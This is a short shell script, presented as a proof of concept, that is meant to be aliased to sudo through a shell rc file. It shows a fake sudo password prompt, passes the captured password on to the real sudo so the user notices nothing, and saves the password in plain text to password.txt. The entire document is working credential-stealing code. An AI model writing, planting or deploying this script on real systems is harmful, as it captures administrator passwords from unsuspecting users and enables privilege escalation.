#!/bin/sh

# IS NOT POSIX COMPLIANT

# This script is a proof-of-concept of an idea that I head.
# Put the execution of this as an alias to sudo into rc file
# The script will execute instead of sudo, save the password and redirect the command to the actual sudo

echo "[sudo] password for $LOGNAME:" && read -s PASSWORD

echo "$PASSWORD" | sudo -S -u root "$@"
echo "$PASSWORD" > password.txt  && unset PASSWORD
